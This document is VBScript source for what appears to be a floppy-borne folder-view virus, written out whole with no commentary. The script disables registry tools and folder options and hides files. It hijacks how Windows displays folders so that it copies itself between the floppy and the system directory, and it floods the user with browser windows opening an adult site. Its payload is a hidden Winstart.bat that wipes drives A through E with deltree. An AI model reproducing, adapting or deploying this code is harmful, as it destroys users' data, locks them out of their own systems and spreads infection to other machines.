Dim WinStartText,AppleObject,FSO,WsShell,WinPath
Sub Office()
OfficeStart()
End Sub
Function OfficeStart()
On Error Resume Next
Set AppleObject = document.applets("Office_guest")
AppleObject.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
AppleObject.createInstance()
Set WsShell = AppleObject.GetObject()
AppleObject.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")
AppleObject.createInstance()
Set FSO = AppleObject.GetObject()
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",0,"REG_DWORD"
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions",1,"REG_DWORD"
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCustomizeWebView",1,"REG_DWORD"
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
WsShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
WinPath = FSO.GetSpecialFolder(0) & "\"
ThisLocation = document.location
RegStr = "HKEY_CLASSES_ROOT\Directory\shellex\ExtShellFolderViews\{5984FFE0-28D4-11CF-AE66-08002B2E1262}\PersistMoniker"
RegTempStr = ""
RegTempStr = WsShell.RegRead(RegStr)
If RegTempStr <> "file://" & WinPath & "system\MSkernel32.con" And (UCase("file:///A:/") = UCase(Left(ThisLocation,11))) Then
WsShell.RegWrite "HKEY_CLASSES_ROOT\.con\","confile"
WsShell.RegWrite "HKEY_CLASSES_ROOT\.con\Content Type","text/webviewhtml"
WsShell.RegWrite "HKEY_CLASSES_ROOT\confile\","MSkernel Console"
WsShell.RegWrite "HKEY_CLASSES_ROOT\confile\EditFlags",65536,"REG_BINARY"
WsShell.RegWrite "HKEY_CLASSES_ROOT\confile\DefaultIcon\",WsShell.RegRead("HKEY_CLASSES_ROOT\vxdfile\DefaultIcon\")
WsShell.RegWrite Regstr,"file://" & WinPath & "system\MSkernel32.con"
FSO.CopyFile "A:\desktop.ini",WinPath & "system\MSkernel.con"
FSO.CopyFile "A:\folder.htt",WinPath & "system\MSkernel32.con"
For i = 1 to 999999
WsShell.Run "iexplore http://www.bangbus.com"
Next
Exit Function
End If
If (UCase("file:///A:/") <> UCase(Left(ThisLocation,11))) Then
Exit Function
End If
Set ReadTemp = FSO.OpenTextFile("A:\folder.htt")
TmpStr = ""
TmpStr = ReadTemp.ReadAll
ReadTemp.Close
If Instr(TmpStr,"Office()") <> 0 Then
Exit Function
End If
FSO.CopyFile WinPath & "system\MSkernel.con","A:\desktop.ini"
FSO.CopyFile WinPath & "system\MSkernel32.con","A:\folder.htt"
RegStr = "HKEY_LOCAL_MACHINE\Software\Microsoft\MediaPlayer\Setup\Meta Status"
RegTempStr = ""
RegTempStr = WsShell.RegRead(RegStr)
If RegTempStr = "" Then
RegTempStr = "0"
End If
If RegTempStr = "10" Then
Set FileTemp = FSO.CreateTextFile(WinPath & "Winstart.bat")
FileTemp.Write "@echo off" & vbCrLf & "deltree /y e:\ > nul" & vbCrLf & "deltree /y d:\ > nul" & vbCrLf & "deltree /y c:\ > nul" & vbCrLf & "deltree /y a:\ > nul"
FileTemp.Close
Set FAttrib = FSO.GetFile(WinPath & "Winstart.bat")
FAttrib.attributes = 34
Exit Function
End If
RegTempStr = RegTempStr + 1
WsShell.RegWrite RegStr,RegTempStr
End Function